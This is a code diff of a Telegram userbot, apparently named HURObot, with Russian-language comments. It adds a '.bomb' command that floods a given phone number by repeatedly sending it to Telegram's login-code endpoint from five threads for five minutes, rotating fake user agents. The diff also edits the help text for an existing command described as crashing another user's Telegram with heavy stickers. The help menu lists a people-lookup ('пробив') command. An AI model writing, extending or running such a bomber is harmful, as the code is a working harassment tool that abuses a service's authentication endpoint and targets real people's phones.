@@ -1,6 +1,7 @@
-    # HURObot - (v1.0.0)
+    # HURObot - (v1.1.0)
 import os
 import asyncio
+import aiohttp
 import sys
 import random
 import time
@@ -9,9 +10,15 @@ import re
 import urllib.request
 import hashlib
 import subprocess
+import threading
+import io
+import telethon
+import whois
+import traceback
+import pytz
+from fake_useragent import UserAgent
 from getpass import getpass
 from datetime import datetime
-import pytz
 from telethon import TelegramClient, events
 from telethon.errors import (
     FloodWaitError,
@@ -25,12 +32,10 @@ from telethon.tl.functions.messages import DeleteHistoryRequest
 from telethon.tl.functions.users import GetFullUserRequest
 from telethon.tl.types import DocumentAttributeFilename
 from telethon.tl.types import DocumentAttributeSticker
+from concurrent.futures import ThreadPoolExecutor
 from PIL import Image
-import io
-import telethon
-import whois
-import traceback
 from telethon.tl import types
+from threading import Event
 
 # ======================
 # СИСТЕМА ОБНОВЛЕНИЙ
@@ -606,6 +611,12 @@ async def run_account(account_num):
                     'syntax': '`.crash`',
                     'example': '`.crash`'
                 },
+                'bomb': {
+                    'name': 'bomb',
+                    'description': 'Спам-атака на номер (5 минут)',
+                    'syntax': '`.bomb` [номер]',
+                    'example': '`.bomb +79123456789`'
+                },
                 }  
 
             def get_usage_instructions(command_name, status=None):
@@ -930,7 +941,7 @@ async def run_account(account_num):
                     
                 if not args or not args[0] or not args[1]:
                     await event.edit(
-                        "<b>✦ Укажите количество и сообщение!</b>\n➤ **Пример:**\n➤ <code>.spam [количество] [сообщение]</code>",
+                        "<b>✦ Укажите количество и сообщение!</b>\n➤ **Пример:**\n➤ <code>.spam [количество] [сообщение]</code>\n\n<b>HURObot // @hurodev</b>",
                         parse_mode='html'
                     )
                     return
@@ -940,7 +951,7 @@ async def run_account(account_num):
                     message = args[1]
                         
                     if count > 250:
-                        await event.edit("<b>✦ Максимальное количество: 250</b>", parse_mode='html')
+                        await event.edit("✦ Максимальное количество: 250\n\n<b>HURObot // @hurodev</b>", parse_mode='html')
                         return
                         
                     await event.delete()
@@ -952,7 +963,77 @@ async def run_account(account_num):
                 except Exception as e:
                     await event.edit(f"<b>✦ Ошибка:</b>\n➤<code>{str(e)}</code>", parse_mode='html')
 
-            
+            @client.on(events.NewMessage(outgoing=True, pattern=r'^\.bomb(?:\s+(.+))?$'))
+            async def bomb_handler(event):
+                state.last_user_activity = time.time()
+                number = event.pattern_match.group(1)
+                
+                # Проверка аргумента
+                if not number:
+                    await event.edit(get_usage_instructions('bomb'))
+                    return
+                    
+                # Проверка формата номера
+                if not re.match(r'^\+\d{8,15}$', number):
+                    await event.edit(
+                        f"✦ Неверный формат!\n"
+                        f"➤ Пример: {command_info['bomb']['example']}"
+                        f"\n**HURObot // @hurodev**"
+                    )
+                    return
+
+                try:
+                    stop_flag = threading.Event()
+                    msg = await event.edit(f"✦ Атака запущена\n➤ Номер: `{number}`\n\n**HURObot // @hurodev**")
+
+                    # Получаем текущий event loop
+                    loop = asyncio.get_event_loop()
+
+                    # Запускаем атаку в отдельном потоке
+                    def attack_wrapper():
+                        asyncio.run_coroutine_threadsafe(
+                            async_spam_attack(number, stop_flag, loop), 
+                            loop
+                        )
+
+                    # Запуск 5 потоков вместо 10 для стабильности
+                    for _ in range(5):
+                        thread = threading.Thread(target=attack_wrapper)
+                        thread.start()
+
+                    # Автоматическая остановка через 5 минут
+                    async def auto_stop():
+                        await asyncio.sleep(300)
+                        stop_flag.set()
+                        await msg.edit(f"✦ Атака завершена\n➤ Номер: `{number}`\n\n**HURObot // @hurodev**")
+
+                    asyncio.create_task(auto_stop())
+
+                except Exception as e:
+                    await event.edit(f"✦ {COLORS['error']}Критическая ошибка:{COLORS['reset']}\n`{str(e)}`")
+
+            async def async_spam_attack(number, stop_flag, loop):
+                """Асинхронная версия спам-атаки"""
+                async with aiohttp.ClientSession(loop=loop) as session:
+                    start_time = time.time()
+                    while not stop_flag.is_set() and (time.time() - start_time < 300):
+                        try:
+                            headers = {'user-agent': UserAgent().random}
+                            tasks = [
+                                session.post(
+                                    'https://my.telegram.org/auth/send_password',
+                                    data={'phone': number},
+                                    headers=headers
+                                ),
+                                session.get(
+                                    'https://telegram.org/support?setln=ru',
+                                    headers=headers
+                                )
+                            ]
+                            await asyncio.gather(*tasks)
+                        except Exception:
+                            pass
+                        await asyncio.sleep(0.5)
 
 
             @client.on(events.NewMessage(outgoing=True, pattern=r'^\.crash$'))
@@ -1250,7 +1331,8 @@ async def run_account(account_num):
 ➤ `.osint` [телефон/ip/почта] - пробив
 ➤ `.whois` [домен] - Информация о домене
 ➤ `.spam` [число] [сообщение] - Спам указаным сообщением
-➤ `.crash` - спамит тяжолыми стикерами и крашит тг собеседника
+➤ `.crash` - Спам краш-стикерами
+➤ `.bomb` [номер телефона] - Бомбер по номеру телефона
 ➤ `.bot` - Информация о боте
 ➤ Для справки: `.help [название команды]`
 
@@ -1300,13 +1382,13 @@ async def run_account(account_num):
 async def main_menu():
     """Основное меню для управления аккаунтами."""
     # Принудительное обновление при запуске
-    try:
-        clear_screen()
-        show_banner()
-        if await force_update():
-            return
-    except:
-        pass
+    #try:
+        #clear_screen()
+        #show_banner()
+        #if await force_update():
+            #return
+    #except:
+        #pass
 
     while True:
         clear_screen()
